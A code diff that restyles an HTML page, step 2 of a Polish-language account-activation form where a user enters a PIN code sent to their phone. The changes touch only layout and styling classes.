@@ -10,17 +10,17 @@
     <title>Page 2</title>
 </head>
 <body class="bg-gradient-to-r from-[#282F42] to-[#2A427F] text-white font-sans font-normal" style="font-family: 'Nobile', sans-serif;">
-    <div class="steps flex flex-col items-center justify-center">
-        <span class="flex mt-20 md:w-[29vw] mb-[1rem] text-sm">Krok 2 of 2</span>
-        <div class="stepline w-[40vw] flex gap-3 justify-center">
-          <div class="rectangle1 rounded-2xl bg-gradient-to-r from-blue-500 to-indigo-600 w-[275px] h-1"></div>
-          <div class="rectangle1 rounded-2xl bg-gradient-to-r from-blue-500 to-indigo-600 w-[275px] h-1"></div>
+    <div class="flex flex-col items-center justify-center mt-[30px] px-8 md:px-0">
+        <span class="mb-[1rem] text-sm">Krok 2 of 2</span>
+        <div class="w-full md:w-[40vw] flex gap-3 justify-center">
+          <div class="rounded-2xl bg-gradient-to-r from-blue-500 to-indigo-600 w-full h-1"></div>
+          <div class="rounded-2xl bg-gradient-to-r from-blue-500 to-indigo-600 w-full h-1"></div>
         </div>
       </div>
       <div class="flex justify-center items-center text-center mt-12" id="loader">
         <img class="w-72 ms:w-36" src="img/lockk.png" alt="" />
       </div>
-      <p class="heading px-2.5 mt-5 flex justify-center text-center">
+      <p class="heading px-8 mt-5 flex justify-center text-center">
         <p class="heading px-2.5 mt-5 flex justify-center text-3xl text-center text-center">Aktywuj swoje konto</p>
         <p class="heading px-2.5 mt-5 flex justify-center text-center text-2xl text-lg">Kod powinien dotrzeć w<br>
         ciągu najbliższych 60 sekund. Został wysłany na numer
@@ -29,13 +29,8 @@
       <div
       class="inputn h14 flex justify-center items-center text-center mt-8 px-2.5"
     >
-      <div
-        class="phoneicon rounded-l-xl flex justify-center bg-gradient-to-r from-[#506295] to-[#374976]  items-center text-center h-12 w-12"
-      >
-        <img class="h-[50%]" src="img/phoneasset.svg" alt="" />
-      </div>
       <input
-        class="inputph bg-gradient-to-r from-[#506295] to-[#374976] rounded-r-xl pl-3 h-12 w-60 "
+        class="inputph bg-gradient-to-r from-[#506295] to-[#374976] rounded-xl pl-3 h-12 w-60 "
         type="text"
         placeholder="Kod PIN"
         id="inputField"
@@ -51,7 +46,7 @@
       class="downloadbtn px-2.5 flex justify-center items-center text-center"  
     >
       <button
-        class="btndm rounded-xl bg-gradient-to-r from-[#265ECF] to-[#4580EF] h-12 w-72 flex justify-center items-center text-center"
+        class="btndm rounded-xl bg-gradient-to-r from-[#265ECF] to-[#4580EF] h-12 w-72 flex justify-center items-center text-center font-bold"
         id="redirectButton"
         type="submit"
         value="redirect"
